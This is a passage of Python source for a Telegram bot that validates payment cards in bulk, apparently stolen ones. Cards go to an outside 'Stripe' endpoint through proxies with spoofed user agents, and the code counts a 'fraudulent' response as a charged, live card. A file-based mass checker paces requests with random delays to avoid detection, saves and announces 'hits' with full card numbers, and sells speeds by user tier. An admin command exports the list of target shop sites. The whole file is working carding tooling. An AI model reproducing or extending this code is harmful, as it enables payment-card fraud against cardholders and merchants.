                print(f"❌ {api_name} - HTTP {response.status_code}")
                
        except httpx.TimeoutException:
            failed_apis.append({
                "name": api_name,
                "url": api_url,
                "error": "Timeout (>30s)",
                "status_code": 0
            })
            results.append(f"⏰ {api_name} - TIMEOUT")
            print(f"⏰ {api_name} - Timeout")
            
        except httpx.ConnectError as e:
            failed_apis.append({
                "name": api_name,
                "url": api_url,
                "error": f"Connection error: {str(e)[:50]}",
                "status_code": 0
            })
            results.append(f"🔌 {api_name} - CONNECTION ERROR")
            print(f"🔌 {api_name} - Connection error")
            
        except Exception as e:
            failed_apis.append({
                "name": api_name,
                "url": api_url,
                "error": str(e)[:80],
                "status_code": 0
            })
            results.append(f"⚠️ {api_name} - ERROR: {str(e)[:50]}")
            print(f"⚠️ {api_name} - Error: {e}")
        
        # Small delay between tests
        await asyncio.sleep(0.5)
    
    # Build result message
    total_apis = len(shopify_api_pool.apis)
    working_count = len(working_apis)
    failed_count = len(failed_apis)
    
    # Sort working APIs by response time (fastest first)
    working_apis.sort(key=lambda x: x["time"])
    
    result_msg = (
        f"📊 <b>Shopify API Pool Test Results</b>\n\n"
        f"📈 <b>Summary:</b>\n"
        f"   ✅ Working: {working_count}/{total_apis}\n"
        f"   ❌ Failed: {failed_count}/{total_apis}\n"
        f"━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    if working_apis:
        result_msg += f"<b>✅ Working APIs ({working_count}):</b>\n"
        for api in working_apis[:15]:
            result_msg += f"   • <b>{api['name']}</b>\n"
            result_msg += f"     ⚡ {api['time']:.2f}s\n"
            result_msg += f"     📝 {api['response'][:50]}\n\n"
        if working_count > 15:
            result_msg += f"   ... and {working_count - 15} more\n\n"
    
    if failed_apis:
        result_msg += f"<b>❌ Failed APIs ({failed_count}):</b>\n"
        for api in failed_apis[:10]:
            result_msg += f"   • <b>{api['name']}</b>\n"
            result_msg += f"     Error: {api['error']}\n\n"
        if failed_count > 10:
            result_msg += f"   ... and {failed_count - 10} more\n\n"
    
    result_msg += f"<i>💡 Use /api to test again\n"
    result_msg += f"   Use /astats for detailed API statistics</i>"
    
    # Send results in chunks if too long
    if len(result_msg) > 4000:
        # Split into multiple messages
        first_part = result_msg[:3800]
        second_part = "📊 <b>Continued...</b>\n\n" + result_msg[3800:4000]
        await status_msg.edit_text(first_part, parse_mode=ParseMode.HTML)
        await update.message.reply_text(second_part, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    else:
        await status_msg.edit_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    
    # Also print to console for debugging
    print("\n" + "="*80)
    print("📊 SHOPIFY API POOL TEST RESULTS")
    print("="*80)
    print(f"✅ Working: {working_count}/{total_apis}")
    print(f"❌ Failed: {failed_count}/{total_apis}")
    print("-"*40)
    for api in working_apis:
        print(f"✅ {api['name']}: {api['time']:.2f}s")
    for api in failed_apis:
        print(f"❌ {api['name']}: {api['error']}")
    print("="*80)


async def enable_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enable a disabled API - /enableapi <api_name>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔧 <b>Enable API</b>\n\n"
            "Usage: <code>/enableapi &lt;api_name&gt;</code>\n"
            "Example: <code>/enableapi 'APAPI 1'</code>\n\n"
            "Use /api to see which APIs are disabled.",
            parse_mode=ParseMode.HTML
        )
        return
    
    api_name = " ".join(context.args)
    
    for api in shopify_api_pool.apis:
        if api["name"] == api_name:
            api["enabled"] = True
            api["fail_count"] = 0
            api["success_count"] = 0
            await update.message.reply_text(f"✅ Enabled API: {api_name}")
            return
    
    await update.message.reply_text(f"❌ API not found: {api_name}")


async def disable_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Disable an API - /disableapi <api_name>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔧 <b>Disable API</b>\n\n"
            "Usage: <code>/disableapi &lt;api_name&gt;</code>\n"
            "Example: <code>/disableapi 'APAPI 1'</code>\n\n"
            "Use /api to see which APIs are working.",
            parse_mode=ParseMode.HTML
        )
        return
    
    api_name = " ".join(context.args)
    
    for api in shopify_api_pool.apis:
        if api["name"] == api_name:
            api["enabled"] = False
            await update.message.reply_text(f"❌ Disabled API: {api_name}")
            return
    
    await update.message.reply_text(f"❌ API not found: {api_name}")


# ============ NEW STRIPE API CHECK FUNCTION ============

async def check_card_new_stripe(card: str, proxy: str = None) -> Dict:
    """
    Check card using the new Stripe API endpoint.
    For this API: "fraudulent" code = CHARGED/LIVE card
    """
    print(f"\n{'='*80}")
    print(f"💳 [NEW STRIPE API] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    print(f"{'='*80}")
    
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "proxy_used": proxy,
        "retryable": False,
        "price": "$0.50"
    }
    
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, card_mm, card_yy, card_cvv = parts
        
        if len(card_yy) == 4:
            card_yy = card_yy[2:]
        
        formatted_card = f"{card_num}|{card_mm}|{card_yy}|{card_cvv}"
        api_url = f"https://stripe-production-45f5.up.railway.app/stripe/key=public/cc={formatted_card}"
        
        print(f"📤 Request URL: {api_url}")
        
        start_time = time.time()
        
        headers = {
            'User-Agent': generate_user_agent(),
            'Accept': 'application/json',
        }
        
        async with httpx.AsyncClient(timeout=60.0, verify=False, follow_redirects=True) as client:
            response = await client.get(api_url, headers=headers)
        
        elapsed = time.time() - start_time
        print(f"📥 Response time: {elapsed:.2f}s")
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)}")
                
                api_status = data.get('status', 'error')
                api_amount = data.get('amount', '$0.50')
                api_card = data.get('card', card[:6] + '******' + card[-4:])
                api_message = data.get('message', '')
                api_code = data.get('code', '')
                
                # ============ FIXED: Check for FRAUDULENT code FIRST ============
                # For this API: "fraudulent" = CHARGED/LIVE card
                if api_code == 'fraudulent':
                    status_display = "🔥 CHARGED 🔥"
                    status_category = "charged"
                    response_msg = "CHARGED "
                    print(f"🎯 CHARGED DETECTED! Code: {api_code}")
                    
                # ============ Check for 3DS_REQUIRED ============
                elif api_code == "3DS_REQUIRED":
                    status_display = "🔐 3D REQUIRED"
                    status_category = "approved"
                    response_msg = "3D REQUIRED"
                    
                # ============ Check for DECLINED with live indicators ============
                elif api_status == 'declined':
                    # Check for other live indicators
                    if 'insufficient' in api_message.lower():
                        status_display = "💰 INSUFFICIENT FUNDS"
                        status_category = "approved"
                        response_msg = "INSUFFICIENT FUNDS - Card has balance issue"
                    elif 'cvv' in api_message.lower() or 'security' in api_message.lower():
                        status_display = "✅ CVV LIVE"
                        status_category = "approved"
                        response_msg = "CVV LIVE - Card is valid"
                    else:
                        status_display = "❌ DECLINED"
                        status_category = "declined"
                        response_msg = api_message or "DECLINED"
                        
                else:
                    status_display = "⚠️ ERROR"
                    status_category = "error"
                    response_msg = api_message or api_status
                
                result = {
                    "status": "success" if status_category in ["charged", "approved", "declined"] else "error",
                    "result": api_status,
                    "message": response_msg,
                    "status_display": status_display,
                    "status_category": status_category,
                    "elapsed": elapsed,
                    "price": api_amount,
                    "card_display": card,
                    "proxy_used": proxy,
                    "gateway": "New Stripe API",
                    "api_used": "stripe_prod",
                    "raw_status": api_status,
                    "raw_code": api_code
                }
                
                return result
                
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                default_result["message"] = "Invalid JSON response"
                default_result["elapsed"] = elapsed
                return default_result
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            default_result["message"] = f"HTTP Error: {response.status_code}"
            default_result["elapsed"] = elapsed
            return default_result
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error")
        default_result["message"] = "Request timeout - API may be slow"
        return default_result
    except Exception as e:
        print(f"❌ Error: {e}")
        default_result["message"] = str(e)[:100]
        return default_result


def format_new_stripe_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format new Stripe API response for display - SHOWS FULL CARD"""
    
    # Safety check - if result is None, create default
    if result is None:
        result = {
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "message": "No response from API",
            "elapsed": 0,
            "proxy_used": "None",
            "price": "$0.50",
            "gateway": "New Stripe API"
        }
    
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    # Get values with safe defaults
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    elapsed = result.get("elapsed", 0)
    proxy_used = result.get("proxy_used", "None")
    price = result.get("price", "$0.50")
    gateway = result.get("gateway", "New Stripe API")
    
    # Show FULL card number (not masked)
    card_display = card
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    # Special handling for test card message
    if 'test card' in message.lower() or 'live_mode_test_card' in message.lower():
        status_display = "⚠️ TEST CARD (API Works)"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_display}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category

async def new_stripe_mass_check_from_file(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Mass check logic for New Stripe API - Batch mode (3 cards at a time with random delays)"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    print(f"\n{'='*80}")
    print(f"🚀 [NEW STRIPE FILE MASS CHECK - BATCH MODE] Starting batch for user {u_id}")
    print(f"📊 Total cards from file: {total}")
    print(f"📦 Batch size: 3 cards at a time")
    print(f"⏱️ Random delays: 1-2 seconds")
    print(f"{'='*80}")
    
    try:
        stripe_charge_active_tasks[u_id] = True
        
        # Initialize stats dictionary
        stats = {
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "total": total,
            "processed": 0
        }
        
        start_time = time.time()
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        # Batch size: 3 cards at a time
        BATCH_SIZE = 3
        # Random delay between cards: 1-2 seconds
        MIN_DELAY = 1.0
        MAX_DELAY = 2.0
        
        if progress_msg is None:
            progress_msg = await message.reply_text(
                f"📁 <b>Processing File - New Stripe API</b>\n\n"
                f"📝 Cards: {total}\n"
                f"💰 Amount: $0.50 per card\n"
                f"📦 Batch: {BATCH_SIZE} cards at a time\n"
                f"⏱️ Random delay: {MIN_DELAY}-{MAX_DELAY}s\n"
                f"🔄 Starting...",
                parse_mode=ParseMode.HTML,
                reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
            )
        
        results_lock = asyncio.Lock()
        hits_sent = 0
        processed = 0
        
        # Process cards in batches of 3
        for batch_start in range(0, total, BATCH_SIZE):
            if u_id not in stripe_charge_active_tasks:
                break
            
            # Get current batch
            batch_end = min(batch_start + BATCH_SIZE, total)
            batch_cards = cards[batch_start:batch_end]
            batch_number = (batch_start // BATCH_SIZE) + 1
            total_batches = (total + BATCH_SIZE - 1) // BATCH_SIZE
            
            print(f"\n📦 Processing Batch {batch_number}/{total_batches} ({len(batch_cards)} cards)")
            
            # Update progress for batch start
            await update_progress_buttons(
                context, message.chat_id, progress_msg.message_id,
                processed, total,
                stats["charged"] + stats["approved"],
                stats["declined"],
                f"Batch {batch_number}/{total_batches}",
                f"Processing {len(batch_cards)} cards..."
            )
            
            # Process cards in this batch concurrently
            batch_tasks = []
            for card in batch_cards:
                task = asyncio.create_task(
                    process_single_new_stripe_card(
                        card, u_id, tier, speed_controller, context, message, stats, results_lock, hits_sent
                    )
                )
                batch_tasks.append(task)
            
            # Wait for all cards in this batch to complete
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            
            # Update processed count and hits_sent
            for result in batch_results:
                if isinstance(result, dict):
                    if result.get('sent'):
                        hits_sent += 1
                    processed += 1
            
            # Update progress after batch
            await update_progress_buttons(
                context, message.chat_id, progress_msg.message_id,
                processed, total,
                stats["charged"] + stats["approved"],
                stats["declined"],
                f"Batch {batch_number} complete",
                f"Processed {processed}/{total} cards..."
            )
            
            # Add random delay between batches (2-4 seconds)
            if batch_end < total:
                batch_delay = random.uniform(2.0, 4.0)
                print(f"⏱️ Waiting {batch_delay:.1f}s before next batch...")
                await asyncio.sleep(batch_delay)
        
        # Final summary
        if u_id in stripe_charge_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            cards_per_minute = (total / (total_time / 60)) if total_time > 0 else 0
            
            summary = (
                f"🏁 <b>File Processing Complete - New Stripe API</b>\n\n"
                f"🔥 Charged/Hits: {stats['charged']}\n"
                f"✅ Approved (CVV/3D): {stats['approved']}\n"
                f"❌ Declined: {stats['declined']}\n"
                f"⚠️ Errors: {stats['errors']}\n"
                f"📝 Total: {stats['total']}\n"
            )
            
            await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        print(f"❌ New Stripe file mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        stripe_charge_active_tasks.pop(u_id, None)
        
async def process_single_new_stripe_card(card: str, u_id: int, tier: str, speed_controller, 
                                          context, message, stats: dict, results_lock: asyncio.Lock, hits_sent: int):
    """Process a single card for New Stripe API with random delay"""
    
    try:
        # Add random delay before processing (1-2 seconds)
        delay = random.uniform(1.0, 2.0)
        await asyncio.sleep(delay)
        
        # Apply speed control
        await speed_controller.wait_if_needed()
        
        start = time.time()
        proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
        result = await check_card_new_stripe(card, proxy_str)
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        # Get BIN info
        bin_info = await get_bin_info(card)
        ui, status_category = format_new_stripe_response(result, card, bin_info)
        response_msg = result.get("message", "")
        
        # Check for hits
        is_hit, hit_type = is_hit_response(response_msg)
        
        sent = False
        
        # Update stats and send result if approved/charged
        if status_category == "charged" or is_hit:
            async with results_lock:
                stats["charged"] += 1
                stats["approved"] += 1
            
            # Send result immediately
            await message.reply_text(ui, parse_mode=ParseMode.HTML)
            
            await save_hit_to_file(
                card=card,
                gateway="New Stripe API",
                response=response_msg,
                price=result.get("price", "$0.50"),
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context,
                gateway="New Stripe API",
                card=card,
                response=response_msg,
                price=result.get("price", "$0.50"),
                user=user_data,
                bin_info=bin_info,
                status_category="charged"
            )
            sent = True
            user_manager.increment_hits(u_id)
            
        elif status_category == "approved":
            async with results_lock:
                stats["approved"] += 1
            
            # Send result for approved (CVV live/Insufficient)
            await message.reply_text(ui, parse_mode=ParseMode.HTML)
            
            await save_hit_to_file(
                card=card,
                gateway="New Stripe API",
                response=response_msg,
                price=result.get("price", "$0.50"),
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            sent = True
            user_manager.increment_hits(u_id)
            
        elif status_category == "declined":
            async with results_lock:
                stats["declined"] += 1
            print(f"🔇 Declined (silent): {card[:20]}...")
            
        else:
            async with results_lock:
                stats["errors"] += 1
            print(f"⚠️ Error (silent): {card[:20]}...")
        
        user_manager.increment_checks(u_id, 1)
        
        return {'sent': sent, 'card': card, 'status': status_category}
        
    except Exception as e:
        print(f"❌ Error processing card {card[:20]}: {e}")
        async with results_lock:
            stats["errors"] += 1
        return {'sent': False, 'card': card, 'error': str(e)}
    
    
async def getsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin only command to export all sites in rotation to a .txt file - /getsite"""
    
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    # Check if user is admin/owner
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    # Get all sites from autosopi_site_manager
    sites = autosopi_site_manager.sites
    
    if not sites:
        await update.message.reply_text("📋 No sites available in rotation.", reply_markup=back_menu())
        return
    
    # Create timestamp for filename
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"sites_export_{timestamp}.txt"
    
    # Write sites to file (one per line)
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            for site in sites:
                # Ensure each site has https:// prefix for consistency
                if not site.startswith(('http://', 'https://')):
                    f.write(f"https://{site}\n")
                else:
                    f.write(f"{site}\n")
        
        # Get additional stats
        failures = autosopi_site_manager.site_failures
        stats = autosopi_site_manager.site_stats
        
        # Count healthy vs dead sites
        healthy_count = 0
        warning_count = 0
        dead_count = 0
        
        for site in sites:
            fail_count = failures.get(site, 0)
            if fail_count >= 3:
                dead_count += 1
            elif fail_count > 0:
                warning_count += 1
            else:
                healthy_count += 1
        
        # Send the file
        with open(filename, 'rb') as file:
            await update.message.reply_document(
                document=file,
                filename=filename,
                caption=(
                    f"📁 <b>Sites Export</b>\n\n"
                    f"📊 Total Sites: {len(sites)}\n"
                    f"✅ Healthy: {healthy_count}\n"
                    f"⚠️ Warning: {warning_count}\n"
                    f"💀 Dead: {dead_count}\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"📅 Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
                ),
                parse_mode=ParseMode.HTML
            )
        
        # Delete the file after sending
        import os
        os.remove(filename)
        
        print(f"📁 Admin {user_id} exported {len(sites)} sites to {filename}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error creating file: {str(e)[:100]}")


